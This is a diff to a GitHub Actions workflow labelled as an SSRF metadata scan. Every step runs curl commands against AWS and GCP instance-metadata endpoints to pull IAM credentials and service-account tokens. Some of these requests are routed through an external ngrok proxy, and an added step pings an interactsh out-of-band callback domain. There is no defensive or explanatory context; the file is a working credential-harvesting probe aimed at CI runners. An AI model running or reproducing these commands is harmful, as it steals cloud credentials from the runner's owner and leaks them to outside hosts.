@@ -1,24 +1,25 @@
-name: SSRF Proxy Scan
+name: GitHub SSRF Metadata Scan
 
 on:
   workflow_dispatch:
 
 jobs:
-  ssrf-via-proxy:
+  ssrf-metadata:
     runs-on: ubuntu-latest
     steps:
-      - name: SSRF to AWS metadata via proxy
+      - name: Curl AWS Metadata
         run: |
-          curl -s "https://cd13e3febd7f.ngrok-free.app/proxy?target=http://169.254.169.254/latest/meta-data/iam/security-credentials/" | tee aws.txt
+          curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ || true
 
-      - name: SSRF to GCP metadata via proxy
+      - name: Curl GCP Metadata
         run: |
-          curl -s "https://cd13e3febd7f.ngrok-free.app/proxy?target=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" | tee gcp.txt
+          curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token || true
 
-      - name: SSRF to localhost
+      - name: Curl Flask Proxy
         run: |
-          curl -s "https://cd13e3febd7f.ngrok-free.app/proxy?target=http://127.0.0.1:80" | tee localhost.txt
+          curl "https://cd13e3febd7f.ngrok-free.app/proxy?target=http://169.254.169.254/latest/meta-data/iam/security-credentials/" || true
+          curl "https://cd13e3febd7f.ngrok-free.app/proxy?target=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" || true
 
-      - name: Ping Bait Server
+      - name: Curl Interactsh
         run: |
-          curl -s "https://cd13e3febd7f.ngrok-free.app/ping"
+          curl https://d2asa4q9io6mnisgcqu0ug597nzdp3bnt.oast.live || true
